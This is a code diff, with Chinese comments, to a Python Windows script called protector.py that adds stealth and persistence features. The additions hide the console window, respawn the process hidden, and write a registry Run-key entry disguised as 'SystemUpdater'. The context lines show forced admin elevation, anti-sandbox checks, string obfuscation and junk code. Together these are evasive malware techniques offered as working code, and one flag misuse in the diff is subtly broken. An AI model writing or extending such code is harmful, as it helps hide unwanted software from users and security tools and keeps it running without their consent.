@@ -1,4 +1,6 @@
-# protector.py
+
+# pip install pywin32 psutil
+
 import os
 import sys
 import time
@@ -9,6 +11,11 @@ import hashlib
 import random
 import subprocess
 from threading import Thread
+
+# 新增Windows API依赖
+import win32con
+import win32gui
+import win32process
 
 # ================= 保护配置 =================
 PROTECTED_PROCESS = "target.exe"    # 要保护的进程名
@@ -26,6 +33,14 @@ class StringObfuscator:
     
     def decrypt(self, s):
         return bytes([ord(c) ^ self.key for c in s]).decode('utf-8')
+
+def hide_console_window():
+    """ 隐藏控制台窗口 """
+    try:
+        window = win32gui.GetForegroundWindow()
+        win32gui.ShowWindow(window, win32con.SW_HIDE)
+    except:
+        pass
 
 def require_admin():
     """ 强制提权运行 """
@@ -46,11 +61,14 @@ def anti_sandbox():
         pass
 
 def process_stealth():
-    """ 基础进程隐藏 """
+    """ 进程隐藏增强 """
     try:
-        import win32process
+        # 设置高优先级
         handle = win32process.GetCurrentProcess()
         win32process.SetPriorityClass(handle, win32process.REALTIME_PRIORITY_CLASS)
+        
+        # 隐藏控制台窗口
+        hide_console_window()
     except:
         pass
 
@@ -60,9 +78,15 @@ def self_healing():
         try:
             current_pid = os.getpid()
             if not psutil.pid_exists(current_pid):
+                # 隐藏窗口启动参数
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = subprocess.SW_HIDE
+                
                 subprocess.Popen(
                     [sys.executable, PROTECTED_PROCESS],
-                    creationflags=subprocess.CREATE_NO_WINDOW
+                    startupinfo=startupinfo,
+                    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE
                 )
                 break
             time.sleep(SELF_HEAL_INTERVAL)
@@ -82,12 +106,15 @@ def junk_code():
     [hashlib.md5(str(x).encode()).hexdigest() for x in range(random.randint(10,20))]
 
 def fake_behavior():
-    """ 伪装正常行为 """
-    ctypes.windll.user32.MessageBoxW(0, 
-        "正在准备系统更新...", 
-        "Microsoft 系统工具", 
-        0x40
-    )
+    """ 伪装正常行为（静默模式） """
+    try:
+        # 模拟正常程序注册表操作
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
+            r"Software\Microsoft\Windows\CurrentVersion\Run")
+        winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, sys.executable)
+        winreg.CloseKey(key)
+    except:
+        pass
 
 if __name__ == "__main__":
     init_protection()
